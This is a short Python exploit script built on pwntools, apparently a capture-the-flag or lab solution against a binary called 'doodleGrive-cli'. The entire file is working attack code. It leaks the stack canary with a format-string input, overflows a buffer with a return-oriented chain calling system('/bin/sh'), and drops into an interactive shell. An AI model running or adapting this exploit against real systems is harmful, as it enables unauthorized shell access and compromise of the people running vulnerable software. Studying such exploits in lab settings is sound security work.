#!/usr/bin/python3
from pwn import process, p64

shell = process("./doodleGrive-cli")
shell.sendlineafter(b"Username:\n", b"%15$p")

shell.recvuntil(b"password for ")
canary = int(shell.recvline()[:-2], 16)

offset = 56
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8      # rbp value
payload += p64(0x401912) # pop rdi; ret;
payload += p64(0x497cd5) # "/bin/sh"
payload += p64(0x40101a) # ret;
payload += p64(0x4119d0) # system()

shell.sendline(payload)
shell.sendlineafter(b"\n", b"export PATH=/bin")
shell.interactive()
